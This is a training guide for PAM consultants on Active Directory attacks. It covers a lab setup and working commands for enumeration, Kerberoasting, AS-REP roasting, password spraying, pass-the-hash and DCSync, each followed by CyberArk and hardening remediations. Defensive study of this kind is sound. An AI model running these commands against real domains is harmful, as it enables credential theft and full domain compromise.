# Active Directory Attack Guide

Understanding Active Directory attacks from a PAM consultant's perspective — you need to know how attackers compromise AD in order to properly implement the PAM controls that prevent it.

---

## Why AD Attacks Matter for PAM Consultants

Active Directory is the identity backbone of nearly every enterprise, and CyberArk's primary job is protecting AD privileged accounts. A CyberArk Defender implementer who has never performed a Kerberoasting attack in a lab is working blind — they can configure the product but cannot explain why the configuration matters, and cannot prioritize controls intelligently.

Understanding how Kerberoasting actually works makes you a better CyberArk Defender implementer. Understanding how DCSync propagates makes you a better architect. Understanding why Golden Tickets persist makes you a more credible advisor. The best PAM architects have all done the attack labs — they know precisely what they are protecting against.

| AD Attack | CyberArk Control That Stops It |
| --- | --- |
| Kerberoasting | Service account vaulting and password rotation |
| AS-REP Roasting | Identity audit feeding CyberArk onboarding workflows |
| Pass-the-Hash | CyberArk Privileged Session Manager (PSM) session isolation |
| DCSync | Protection and monitoring of replication rights accounts |
| Golden Ticket | CyberArk PTA Golden Ticket detection + managed krbtgt rotation |
| Password Spraying | CyberArk Privileged Threat Analytics authentication anomaly |
| Lateral Movement | CyberArk least-privilege enforcement + PSM session isolation |

The best PAM architects have done the attack labs. They know what they are protecting against.

---

## Active Directory Fundamentals (Attack Perspective)

### Kerberos Authentication Flow

Kerberos is the primary authentication protocol for modern Active Directory. Its ticket-based design is both elegant and the source of several well-known attacks.

- **AS-REQ / AS-REP**: Client sends an Authentication Service Request to the Key Distribution Center (KDC); KDC replies with a Ticket Granting Ticket (TGT) encrypted with the krbtgt account's key
- **TGS-REQ / TGS-REP**: Client presents the TGT to the KDC and requests a service ticket for a specific Service Principal Name (SPN); KDC replies with a TGS ticket encrypted with the target service account's password hash
- **Service Access**: Client presents the TGS ticket to the target service, which decrypts and verifies it

Why this matters to attackers: the TGT and TGS tickets, and the krbtgt key that signs them all, are the direct targets of Kerberoasting (cracks TGS tickets offline), AS-REP roasting (cracks AS-REP responses offline), and Golden Ticket forgery (forges arbitrary TGTs using the stolen krbtgt key).

```text
+--------+    1. AS-REQ    +-----+
| Client | --------------> | KDC |
+--------+                  +-----+
    ^                         |
    | 2. AS-REP (TGT)          |
    +-------------------------+
    |
    | 3. TGS-REQ (present TGT, request SPN)
    v
+-----+
| KDC |
+-----+
    |
    | 4. TGS-REP (service ticket)
    v
+--------+   5. Use service ticket   +---------+
| Client | ------------------------> | Service |
+--------+                            +---------+
```

### Key AD Objects for Attackers

- **Service Principal Names (SPNs)**: Identifiers that link a service instance (e.g. `MSSQLSvc/db01.corp.local:1433`) to a domain account. Any account with an SPN set is Kerberoastable by any authenticated user in the domain — this is a design feature, not a vulnerability.
- **Service Accounts**: Frequently over-privileged, configured with passwords that never expire, and often set to weak or predictable values — a prime attacker target.
- **Delegation Types**: Unconstrained delegation allows a service to impersonate users to any other service — catastrophic if compromised. Constrained delegation limits impersonation to specific services. Resource-based constrained delegation (RBCD) shifts the trust decision to the resource owner and is frequently abused.
- **Domain Admins vs Enterprise Admins vs Built-in Administrators**: Domain Admins have full control of one domain; Enterprise Admins have full control across a forest (all domains); the Built-in Administrators group in the forest root domain is effectively equivalent to Enterprise Admins for many purposes. Attackers aim for Enterprise Admin when available.
- **AdminSDHolder and SDProp**: Active Directory uses the AdminSDHolder object and the SDProp process to periodically reapply a standard ACL to members of privileged groups. Attackers who modify AdminSDHolder can persist privileged access across cleanup efforts.

---

## Lab Setup

### Building a Vulnerable AD Lab

Requirements:

- 1 Windows Server 2022 Domain Controller (VM)
- 1-2 Windows 10 or Windows 11 workstations joined to the domain (VMs)
- 1 Kali Linux attacker VM
- All systems on a dedicated internal-only virtual network

Windows Server evaluation ISOs are available free for 180 days from the Microsoft Evaluation Center.

```powershell
# Promote a Windows Server to a Domain Controller (from elevated PowerShell)
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
Install-ADDSForest `
    -DomainName "corp.local" `
    -DomainNetBIOSName "CORP" `
    -InstallDNS `
    -Force

# Create a Kerberoastable service account after reboot
New-ADUser -Name "svc_sql" -AccountPassword (ConvertTo-SecureString "SummerTime2024!" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true
Set-ADUser -Identity svc_sql -ServicePrincipalNames @{Add="MSSQLSvc/db01.corp.local:1433"}

# Create an AS-REP roastable user
New-ADUser -Name "legacy_user" -AccountPassword (ConvertTo-SecureString "Welcome1" -AsPlainText -Force) -Enabled $true
Set-ADAccountControl -Identity legacy_user -DoesNotRequirePreAuth $true
```

For faster lab creation use pre-built scripts:

- **BadBlood** — populates an AD environment with thousands of realistic objects and deliberately weak configurations: https://github.com/davidprowe/BadBlood
- **GOAD (Game of Active Directory)** — full pre-built vulnerable AD forest with multiple domains and attack scenarios: https://github.com/Orange-Cyberdefense/GOAD

### Network Configuration

- Use an internal-only virtual switch (vmnet/vboxnet) with no NAT to the Internet
- The Domain Controller must also serve as the DNS server for all domain-joined machines
- The Kali attacker VM connects to the same internal network and uses the DC as its DNS server when querying AD
- Snapshot every VM before running destructive attacks — a lab that cannot be restored is a lab you will stop using

---

## Attack Techniques

### Enumeration

#### LDAP Enumeration

- Tools: `ldapsearch`, `enum4linux-ng`, `windapsearch`
- Information gathered: users, groups, GPOs, password policies, trust relationships, service accounts

```bash
# Anonymous LDAP bind test
ldapsearch -x -H ldap://10.10.10.10 -s base namingcontexts

# Authenticated enumeration of all users
ldapsearch -x -H ldap://10.10.10.10 -D 'alice@corp.local' -w 'Password1' -b 'dc=corp,dc=local' '(objectClass=user)'

# enum4linux-ng — comprehensive SMB/LDAP enumeration
enum4linux-ng -A 10.10.10.10
```

#### SMB Enumeration

- Tools: CrackMapExec / NetExec, smbclient, smbmap

```bash
# Share enumeration with credentials
crackmapexec smb 10.10.10.10 -u alice -p 'Password1' --shares

# Null session check
smbclient -L //10.10.10.10 -N

# User enumeration via RID cycling
crackmapexec smb 10.10.10.10 -u alice -p 'Password1' --rid-brute 10000
```

#### BloodHound Collection

- Run SharpHound.exe or SharpHound.ps1 as a domain user from a Windows host
- Collect all data types with `--CollectionMethod All`
- Import the resulting JSON files into BloodHound CE

Key queries to run first:

1. Find all Domain Admins
2. Shortest Paths to Domain Admins
3. Find Kerberoastable Users
4. Find AS-REP Roastable Users
5. Shortest Paths from Owned Principals
6. Find Workstations Where Domain Users Can RDP

### Credential Attacks

#### Kerberoasting

- **Concept**: Any authenticated domain user can request TGS tickets for accounts that have a Service Principal Name set. The returned TGS ticket is encrypted with the service account's NTLM password hash, so it can be cracked offline.
- **Prerequisites**: Valid domain user credentials (any low-privilege user works)
- **Impact**: Compromises service accounts, which are frequently configured with high privileges

```bash
# Request TGS tickets for all SPN-enabled accounts
impacket-GetUserSPNs corp.local/alice:'Password1' -dc-ip 10.10.10.10 -request -outputfile kerberoast.hashes

# Crack with Hashcat (mode 13100 = Kerberos TGS)
hashcat -m 13100 -a 0 kerberoast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**PAM remediation**: Vault every service account in CyberArk; rotate passwords on a regular schedule (aggressive rotation makes cracked passwords worthless); use Managed Service Accounts (MSAs / gMSAs) where supported; audit all SPN-enabled accounts quarterly.

#### AS-REP Roasting

- **Concept**: Accounts configured with "Do not require Kerberos preauthentication" return an AS-REP response to anyone who requests it for that username. The AS-REP contains data encrypted with the user's password hash, enabling offline cracking.
- **Prerequisites**: A valid domain username (can be enumerated via anonymous LDAP or OSINT — credentials are not required for this attack)

```bash
# AS-REP roasting against a user list
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat -outputfile asrep.hashes

# Crack with Hashcat (mode 18200 = Kerberos AS-REP)
hashcat -m 18200 -a 0 asrep.hashes /usr/share/wordlists/rockyou.txt
```

**PAM remediation**: Audit all accounts for the "Do not require Kerberos preauthentication" flag; disable the flag wherever it is not required for legitimate legacy systems; migrate remaining legacy systems off this configuration.

#### Password Spraying

- **Concept**: Test a single common password against many accounts to avoid triggering account lockouts. Much more effective than brute-forcing a single account because most lockout policies count failed attempts per account, not per password.
- **Tools**: CrackMapExec (`--continue-on-success`), Spray, Kerbrute
- **Prerequisites**: A valid username list (from LDAP enumeration or OSINT)

```bash
# Password spray with Kerbrute (stealthier — uses Kerberos pre-auth)
kerbrute passwordspray -d corp.local --dc 10.10.10.10 users.txt 'Winter2025!'

# Password spray with CrackMapExec
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Winter2025!' --continue-on-success
```

Warning: always check the lockout policy (`net accounts /domain` or via LDAP) before spraying — locking out half the domain will get the engagement paused and the client angry.

**PAM remediation**: CyberArk Privileged Threat Analytics detects abnormal authentication patterns including distributed failed-login events characteristic of password sprays.

### Post-Compromise Attacks

#### Pass-the-Hash (PtH)

- **Concept**: Use an NTLM hash directly for authentication to NTLM-capable services — no password cracking required. Works against SMB, WMI, WinRM, and other NTLM-backed services.
- **Prerequisites**: Admin-level access on one host to extract hashes (via Mimikatz or secretsdump), then authenticate to other hosts that share credentials

```bash
# WMI execution using NTLM hash instead of password
impacket-wmiexec -hashes :NTLMHASH corp.local/administrator@10.10.10.20

# Check local admin across a subnet using a hash
crackmapexec smb 10.10.10.0/24 -u administrator -H NTLMHASH --local-auth
```

**PAM remediation**: CyberArk Privileged Session Manager (PSM) isolation prevents credentials from ever touching endpoint memory — no hash to steal means no Pass-the-Hash. Disable NTLM where possible; enable Windows Defender Credential Guard on Windows 10/11 enterprise endpoints.

#### DCSync Attack

- **Concept**: Abuses the Active Directory replication mechanism (specifically the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended rights) to request password hashes for any account — including the all-powerful krbtgt account.
- **Prerequisites**: An account with replication permissions — Domain Admin, Enterprise Admin, or any account granted replication rights (a common misconfiguration)

```bash
# DCSync via Impacket secretsdump
impacket-secretsdump corp.local/administrator:'Password1'@10.10.10.10 -just-dc

# Target only the krbtgt account
impacket-secretsdump corp.local/administrator:'Password1'@10.10.10.10 -just-dc-user krbtgt
```

**Result**: NTLM hashes for every domain user including krbtgt — which enables Golden Ticket forgery.

**PAM remediation**: Vault every account with replication permissions in CyberArk; monitor AD replication events for unexpected source IPs (replication from a non-DC host is a red flag); remove unnecessary replication permissions during AD hygiene engagements.

#### Golden Ticket Attack

- **Concept**: Use the krbtgt NTLM hash to forge a Kerberos TGT with arbitrary contents — group membership, validity period, user identity. Because the krbtgt hash signs all TGTs in the domain, a forged TGT is indistinguishable from a legitimate one.
- **Prerequisites**: krbtgt NTLM hash (obtained via DCSync) and the domain SID
- **Tools**: Mimikatz (`kerberos::golden`), Impacket `ticketer.py`

**Why this is catastrophic**: A Golden Ticket continues to work even after password resets of the compromised user, because it is signed directly with the krbtgt key. The default TGT lifetime embedded in a forged ticket is 10 years. The only way to invalidate existing Golden Tickets is to rotate the krbtgt password twice — a procedure that is disruptive and rarely done without prior compromise discovery.

**PAM remediation**: CyberArk Privileged Threat Analytics includes specific Golden Ticket detection logic (anomalous TGT lifetime, mismatched PAC signatures); use CyberArk to manage and schedule krbtgt password rotations as part of an AD hygiene program.

Note: The Golden Ticket attack is the attack PAM was specifically designed to prevent — once an attacker has krbtgt, recovery requires rebuilding trust in the domain. PAM closes the paths that lead to krbtgt compromise in the first place.

### Lateral Movement

#### Techniques Overview

- **Pass-the-Hash**: Covered above
- **Pass-the-Ticket**: Use a Kerberos ticket directly — inject a stolen TGT or TGS into an attacker session
- **Overpass-the-Hash**: Convert a stolen NTLM hash into a Kerberos TGT, then use Kerberos authentication for lateral movement (cleaner logs than NTLM)
- **Remote execution**: `psexec.py`, `wmiexec.py`, `smbexec.py`, `atexec.py` (scheduled tasks) — each leaves different artifacts and requires different defenses

#### Finding Lateral Movement Paths

- BloodHound query: "Shortest Paths to High Value Targets"
- Look for edges: `AdminTo`, `CanRDP`, `CanPSRemote`, `GenericAll`, `GenericWrite`, `WriteDACL`, `WriteOwner`, `ForceChangePassword`

---

## Defenses and Detections

| Attack | Detection Signal | CyberArk Control | AD Hardening |
| --- | --- | --- | --- |
| Kerberoasting | High volume of TGS requests for service accounts | PTA service account monitoring | Managed Service Accounts with long random passwords |
| AS-REP Roasting | AS-REP responses without preceding AS-REQ pattern | PTA anomalous Kerberos analytics | Require Kerberos pre-authentication on every account |
| Pass-the-Hash | NTLM authentication from non-standard source hosts | PSM session isolation | Disable NTLM where possible; Windows Defender Credential Guard |
| DCSync | AD replication events from non-DC source IPs | PTA DCSync detection | Remove unnecessary replication permissions; vault replication accounts |
| Golden Ticket | Anomalous TGT lifetime; missing or mismatched PAC signatures | PTA Golden Ticket detection | Rotate krbtgt twice annually; detect via Advanced Threat Analytics |
| Password Spray | Distributed failed logons across many accounts with same password | PTA authentication anomaly detection | Strong lockout policy + long unique passwords via PAM |

---

## Practice Resources

- TryHackMe "Active Directory Basics": https://tryhackme.com/room/winadbasics
- TryHackMe "Attacktive Directory": https://tryhackme.com/room/attacktivedirectory
- TryHackMe "Post-Exploitation Basics": https://tryhackme.com/room/postexploit
- HackTheBox "Forest" (classic AD machine, AS-REP roasting + DCSync): https://app.hackthebox.com/machines/Forest
- HackTheBox "Active" (Kerberoasting classic): https://app.hackthebox.com/machines/Active
- HackTheBox "Sauna" (AS-REP roasting + Win privesc): https://app.hackthebox.com/machines/Sauna
- GOAD (Game of Active Directory) — full vulnerable lab: https://github.com/Orange-Cyberdefense/GOAD
- BadBlood — auto-create messy AD: https://github.com/davidprowe/BadBlood
- SpecterOps BloodHound documentation: https://bloodhound.specterops.io

---

**Last Updated**: 2026-04-14
**Version**: 1.0
